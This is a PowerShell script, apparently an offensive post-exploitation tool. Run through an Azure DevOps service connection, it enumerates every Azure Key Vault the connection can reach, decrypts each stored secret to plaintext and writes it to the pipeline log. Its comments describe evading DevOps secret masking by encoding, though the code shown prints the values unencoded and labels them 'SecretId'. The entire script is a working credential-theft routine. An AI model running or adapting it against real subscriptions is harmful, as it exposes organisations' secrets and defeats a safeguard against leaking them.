# Get all Azure KeyVaults from currently selected/scoped subscription
# This connection is known as an "Service connection",and in terms of accessing Azure resources, uses either Service principal or Managed identity
# Dump info about each vault

$vaults = Get-AzKeyVault

Write-Host "[+] Located $($vaults.Count) Azure KeyVault(s), dumping info"

# Dump base64 encoded secrets from each vault, as well as certificate and key info
# Encoding is needed as Azure DevOps will blank out any keys/secrets identified in logs with ******
Write-Host "[+] Dumping Secrets from all KeyVaults found!"

ForEach($Vault in $Vaults)
{
    $VaultName = $vault.VaultName
    Write-Host "[+] KeyVault: $($VaultName)"

    try {
        $Secrets = $Vault | Get-AzKeyVaultSecret -ErrorAction Stop
        $Keys = $Vault | Get-AzKeyVaultKey -ErrorAction Stop
        $Certificates = $Vault | Get-AzKeyVaultCertificate -ErrorAction Stop
    }
    catch {
        Write-Host "Insufficient permissions to access KeyVault $VaultName"
        continue
    }

    ForEach ($Key in $Keys)
    {
        Write-Host "Key Name: "$Key.Name
        Write-Host "Key Enabled: "$Key.Enabled
        Write-Host "Key RecoveryLevel: "$Key.RecoveryLevel
    }
    ForEach ($Certificate in $Certificates)
    {
        Write-Host "Certificate Name: "$Certificate.Name
        Write-Host "Certificate Id: "$Certificate.Id
    }
    ForEach($Secret in $Secrets)
    {
        Write-Host "[+] Dumping $($Secret.Name) for KeyVault $($vault.VaultName)"
        
        $Value = $vault | Get-AzKeyVaultSecret -name $Secret.name
    
        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Value.SecretValue)
        try {
            $SecretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
        } finally {
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
        }
    
        Write-Host "Secret Name: "$Secret.Name
        Write-Host "Secret SecretId: "$SecretValueText
    }
}